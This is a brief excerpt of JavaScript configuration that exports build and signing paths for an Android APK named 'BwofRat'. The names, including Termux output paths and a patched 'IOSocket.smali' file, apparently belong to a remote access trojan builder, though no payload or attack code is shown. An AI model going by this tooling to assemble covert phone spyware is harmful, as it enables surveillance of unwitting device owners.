...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/BwofRat.apk')

exports.termuxApkBuildPath = exports.termux + '/bwofrat/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/bwofrat/BwofRat.apk'
...
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/thebwof/bwofrat/IOSocket.smali');
